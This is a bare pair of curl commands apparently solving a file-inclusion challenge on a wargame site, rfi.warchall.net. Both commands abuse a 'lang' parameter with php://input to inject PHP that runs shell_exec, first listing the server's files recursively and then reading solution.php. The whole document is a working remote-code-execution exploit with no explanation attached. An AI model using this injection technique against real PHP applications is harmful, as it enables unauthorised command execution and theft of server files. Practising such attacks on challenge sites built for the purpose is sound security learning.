curl 'http://rfi.warchall.net/?lang=php://input' --data '<?=shell_exec("ls -RAl")?>'

curl 'http://rfi.warchall.net/?lang=php://input' --data '<?=shell_exec("cat solution.php")?>'

